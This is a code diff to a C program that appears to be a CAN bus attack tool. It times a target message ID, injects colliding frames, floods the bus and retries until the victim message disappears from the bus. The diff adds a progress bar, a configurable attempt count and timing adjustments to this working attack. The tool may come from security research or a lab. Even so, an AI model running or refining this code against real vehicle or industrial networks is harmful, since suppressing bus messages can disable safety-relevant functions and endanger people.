@@ -4,12 +4,38 @@
 #include <time.h>
 #include <sys/wait.h>
 #include "canox.h"
+#include <sys/ioctl.h>
 
 #define MAX_LONG_NAME 255
 #define ID_TEST 0x07A
 #define MAX_ATTEMPTS 10
 
 char interface[MAX_LONG_NAME];
+int max_attempts;
+
+int get_terminal_width() {
+    struct winsize w;
+    if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == -1) {
+        return -1; // error
+    }
+    return w.ws_col;
+}
+
+void draw_progress(float value, float total) {
+    float progress = ((float)value)/((float)total);
+    int width = get_terminal_width();
+    if (width < 20) width = 20; // avoid too small
+
+    int bar_width = width - 17;
+    int filled = (int)(progress * bar_width);
+
+    printf("\r[");
+    for (int i = 0; i < bar_width; i++) {
+        putchar(i < filled ? '#' : ' ');
+    }
+    printf("] [%3.0f/%3.0f] %3.0f%%", value, total, progress * 100);
+    fflush(stdout);
+}
 
 void run_generators() {
   srand(time(NULL) ^ getpid() ^ (getppid() << 16));
@@ -36,51 +62,63 @@ long diff_us(struct timespec *start, struct timespec *end) {
 }
 
 void attack() {
+  int total_values = 512;
   if (setup_filter_attack(ID_TEST)) {
     fprintf(stderr, "Error applying filter!\n");
     return;
   }
 
-  printf("\n\nSTARTING THE ATTACK!\n");
-
-  long time_diffs[512];
-  struct timespec t1, t2;
-  clock_gettime(CLOCK_MONOTONIC, &t1);
-  clock_gettime(CLOCK_MONOTONIC, &t2);
+  printf("\n\n*** STARTING THE ATTACK! ***\n");
+  printf("\n\nANALYZING TARGET BEHAVIOUR!\n");
   
+  draw_progress(0, total_values);
+  long time_diffs[total_values];
+  struct timespec t1, t2;
+
   struct can_frame test_frame;
 
-  printf("\n\nANALYZING TARGET BEHAVIOUR!\n");
-  for (int i = 0; i<512; i++) {
+  do {
+    read_can_frame(&test_frame);
+  } while (test_frame.can_id != ID_TEST); 
+
+
+  clock_gettime(CLOCK_MONOTONIC, &t1);
+  clock_gettime(CLOCK_MONOTONIC, &t2);  
+
+  for (int i = 0; i<total_values; i++) {
     do {
       read_can_frame(&test_frame);
     } while (test_frame.can_id != ID_TEST); 
     clock_gettime(CLOCK_MONOTONIC, &t2);
     time_diffs[i] = diff_us(&t1, &t2);
-    test_frame.can_id = 0x7FF;
+    
     clock_gettime(CLOCK_MONOTONIC, &t1);
     clock_gettime(CLOCK_MONOTONIC, &t2);
+
+    test_frame.can_id = 0x7FF;
+    draw_progress(i+1, total_values);
   }
 
   long double sum = 0;
-  for (int i = 0; i < 512; i++) {
+  for (int i = 0; i < total_values; i++) {
       sum += time_diffs[i];
   }
-  long avg_time = (long)(sum/512);  
+  long avg_time = (long)(sum/total_values);  
 
-  printf("avg_time: %ld", avg_time);
+  printf("AVERAGE TIME BETWEEN MESSAGES: %ld us\n", avg_time);
 
   int n = 0;
   char has_message = 1;
 
-  while(n<MAX_ATTEMPTS && has_message == 1) {
+  while(n<max_attempts && has_message == 1) {
+    printf("\nATTEMPT %d\n1 - SENDING ONE COLLIDING MESSAGE", (n+1));
     n++;
     struct can_frame frame;
     do {
       read_can_frame(&frame);
     } while (frame.can_id != ID_TEST); 
     
-    usleep(avg_time-510);
+    usleep(avg_time-505);
 
     frame.can_id = 0x1;
     for (int j = 0; j < frame.can_dlc; j++) {
@@ -92,9 +130,8 @@ void attack() {
       write_can_frame(&frame);  
       usleep(30);
     }
-    printf("\nFINISHED FRAME INJECTION\n"); 
-    printf("FLOODING THE BUS CAN\n");
-    for (int i = 0; i < 50; i++) {
+    printf("\n\n2 - FLOODING THE BUS CAN\n");
+    for (int i = 0; i < 16; i++) {
       frame.can_id = 0x777;
       write_can_frame(&frame);  
       usleep(2*99);
@@ -112,16 +149,28 @@ void attack() {
     clock_gettime(CLOCK_MONOTONIC, &t1);
     clock_gettime(CLOCK_MONOTONIC, &t2);
 
+    frame.can_id = 0x7FF;
+
     while ((read_can_frame(&frame) || frame.can_id != ID_TEST) && (diff_us(&t1, &t2) < 1000000L) ){
       clock_gettime(CLOCK_MONOTONIC, &t2);
     }
 
     if (diff_us(&t1, &t2) >= 1000000L) {
       has_message = 0;
+    } else {
+      printf("VICTIM MESSAGE STILL PRESENT, RETRYING\n\n");
+    }
+    
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    clock_gettime(CLOCK_MONOTONIC, &t2);
+    
+    while(diff_us(&t1, &t2) < 500000L) {
+      read_can_frame(&frame);
+      clock_gettime(CLOCK_MONOTONIC, &t2);
     }
   }
 
-  printf("\nFINISHED ATTACK!\n");
+  printf("\n\n*** FINISHED ATTACKING IN %d ATTEMPTS ***\n\n", n);
 }
 
 int main(int argc, char **argv){
@@ -131,15 +180,21 @@ int main(int argc, char **argv){
       snprintf(interface, sizeof(interface), "%s", argv[1]);
   }
   if (argc > 2) {
-      num_generators = atoi(argv[2]);
+    max_attempts = atoi(argv[2]);
+    if (max_attempts < 1) {
+      max_attempts = MAX_ATTEMPTS;
+    }
+  }
+  if (argc > 3) {
+      num_generators = atoi(argv[3]);
   }
   if (argc < 2) {
       fprintf(stderr, "You need to specify an interface!\n");
-      printf("Usage: %s <interface> [<num_generators>]\n", argv[0]);
+      printf("Usage: %s <interface> [<max_attempts>(default 10)] [<num_generators>]\n", argv[0]);
       return 1;
   }
 
-  printf("Generators: %d", num_generators); 
+  printf("Max Attempts: %d\tGenerators: %d", max_attempts, num_generators); 
   pid_t children[num_generators];
 
 
